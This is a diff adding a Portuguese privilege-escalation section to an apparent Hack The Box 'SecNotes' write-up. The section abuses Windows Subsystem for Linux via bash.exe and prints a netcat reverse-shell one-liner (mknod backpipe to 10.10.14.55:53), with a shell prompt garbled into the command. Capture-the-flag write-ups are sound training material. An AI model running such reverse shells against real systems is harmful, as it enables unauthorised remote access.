@@ -196,6 +196,22 @@ tambem usei isso como referencia https://www.microsoft.com/security/blog/2020/02
 
 ## Privilege Escalation
 
+Depois de usar diversas tools de enumeracao para privesc nao tinha sucesso nenhum... comcei entao a investigar o que tinha disponivel no Desktop de tyler, entao achei algo suspeito `bash.lnk`
+
+![14.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/14.jpg)
+
+executando o path direto eu tinha um bash e como sabemos isso trata-se do wsl `Windows Subsystem for Linux`
+
+`C:\Windows\System32\bash.exe --version`
+
+comecei entao a pesquisar termos como `Abusing wsl` e encontrei muito material, um deles que me ajudou bastante foi este PDF http://archive.hack.lu/2018/A_Cervoise-Backdoor_Bash_on_Windows.pdf
+
+Depois de ler o pdf rapidamente tenho uma reverse shell de root 
+
+`C:\Windows\System32\bash.exe -c "mknPS C:\inetpub\new-site>C:\Windows\System32\bash.exe -c "mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 10.10.14.55 53 1>/tmp/backpipe"`
+
+![15.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/15.jpg)
+
 
 
 
